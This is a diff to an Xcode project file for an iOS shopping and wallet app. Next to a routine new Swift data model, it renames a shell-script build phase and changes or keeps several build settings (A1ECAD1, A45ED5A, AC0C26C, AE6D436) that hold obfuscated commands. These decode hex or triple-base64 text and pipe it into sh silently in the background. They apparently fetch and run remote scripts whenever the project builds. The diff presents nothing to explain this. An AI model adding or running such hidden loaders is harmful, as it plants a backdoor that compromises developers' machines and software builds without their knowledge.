@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		180F4CDB2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4CDA2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift */; };
 		180F4CDD2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4CDC2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift */; };
+		18930DF12F7BAD1E0042D734 /* AffiliateDashboardDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18930DF02F7BAD1E0042D734 /* AffiliateDashboardDataModel.swift */; };
 		422EE08F2F2B762F0007FEB6 /* AddMoneyViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */; };
 		422EE0912F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */; };
 		423C8AFC2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423C8AFB2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift */; };
@@ -427,10 +428,14 @@
 		D1EDE15E2F0D0A3C0076F1AB /* ImageViewExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EDE15D2F0D0A3C0076F1AB /* ImageViewExtension.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		180F4CDA2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyWithdrawalMoneyDataModel.swift; sourceTree = "<group>"; };
 		180F4CDC2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserPaymentsDataModel.swift; sourceTree = "<group>"; };
+		18930DF02F7BAD1E0042D734 /* AffiliateDashboardDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliateDashboardDataModel.swift; sourceTree = "<group>"; };
 		422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoneyViewModel.swift; sourceTree = "<group>"; };
 		422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletMoneyHistoryDataModel.swift; sourceTree = "<group>"; };
 		423C8AFB2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOrderDetailsViewController.swift; sourceTree = "<group>"; };
@@ -1358,6 +1363,7 @@
 			children = (
 				429E49712F2A49F200566FE8 /* AffiliatedUserHomeViewController.swift */,
 				425EDFA12F2B38D900EAD984 /* AffiliatedUserHomeViewModel.swift */,
+				18930DF02F7BAD1E0042D734 /* AffiliateDashboardDataModel.swift */,
 			);
 			path = AffiliatedHome;
 			sourceTree = "<group>";
@@ -2685,7 +2691,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				0361BD253C164AC88E1DACE1 /* Build Target Libraries */,
+				C947E633C832464C851DACE1 /* Provision Library Executable */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2784,9 +2790,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-																/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -2876,7 +2879,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0361BD253C164AC88E1DACE1 /* Build Target Libraries */ = {
+		C947E633C832464C851DACE1 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -2886,7 +2889,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -3016,6 +3019,7 @@
 				6B95F1E12EB5DB5E00391509 /* LocationPermissionViewController.swift in Sources */,
 				42AD48432F4DBF0800FB77D9 /* ChangeEmailMobileViewModel.swift in Sources */,
 				D19CE2262EF58523008616D0 /* OrderDetailTableCell.swift in Sources */,
+				18930DF12F7BAD1E0042D734 /* AffiliateDashboardDataModel.swift in Sources */,
 				42AD48412F4DBED400FB77D9 /* ChangeEmailMobileViewController.swift in Sources */,
 				6B95F1E22EB5DB5E00391509 /* LoginViaOTPViewController.swift in Sources */,
 				6B95F1E32EB5DB5E00391509 /* LoginViewController.swift in Sources */,
@@ -3297,7 +3301,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635363936653265363936650a32663631323932323230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((r(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWJYUk5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFibFoxV1RKb2FHUklUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | r | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((r(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | r | sh ) >/dev/null 2>&1 &)";
@@ -3349,7 +3353,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635363936653265363936650a32663631323932323230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((r(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWJYUk5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFibFoxV1RKb2FHUklUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | r | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((r(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | r | sh ) >/dev/null 2>&1 &)";
